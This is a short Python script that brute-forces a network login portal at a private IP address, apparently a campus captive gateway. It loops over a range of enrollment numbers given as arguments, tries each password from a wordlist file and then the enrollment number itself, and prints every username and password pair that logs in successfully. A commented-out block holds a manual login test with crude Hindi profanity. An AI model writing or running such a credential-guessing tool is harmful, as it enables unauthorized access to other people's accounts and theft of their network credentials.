from urllib.parse import urlencode
from urllib.request import urlopen
from os import system, devnull, path
import subprocess
import signal
from sys import argv, exit
from time import sleep
from json import load
import sys

# For periodic checking of login status
SLEEP_TIME = 120

BASE_URL = "http://172.16.68.6:8090/login.xml"

def send_request(request_type, *arg):
    if(request_type == 'login'):
        #print ("Initialting login request for USERNAME: %s" % arg[0])
        params = urlencode(
            {'mode': 191, 'username': arg[0], 'password': arg[1]})
    elif(request_type == 'logout'):
        print ("Initiating logout request..")
        params = urlencode({'mode': 193, 'username': arg[0]})
    binary_data=params.encode('utf-8')
    response = urlopen(BASE_URL, binary_data)
    return response.read().decode("utf-8")
r=[]
with open("pass.txt") as fo:
	for line in fo:
		r.append(line.strip())
#print(r)
fo.close()

def logger(enrl):
	for pw in r:
		res=send_request('login',enrl,pw)
		#print(res)
		if 'successfully logged into' in res:#or 'data transfer has been' in res or 'Maximum Login Limit' in res:
			print(enrl,'------>',pw)
			return
	res=send_request('login',enrl,enrl)
	if 'successfully logged into' in res:# or 'data transfer has been' in res or 'Maximum Login Limit' in res:
		print(enrl,'------>',enrl)
		return
	print(enrl)

'''
rn=input('Enroll Number: ')
pw=input('Password dalio: ')
res=send_request('login',rn,pw)
if 'successfully logged into' in res:
	print("Login ho gaya")
else:
	print("Nahi hua login, bhenchod")
'''
def genfrom(start,stop):
	for en in range(start,stop):
		logger(str(en))

genfrom(int(sys.argv[1]),int(sys.argv[2]))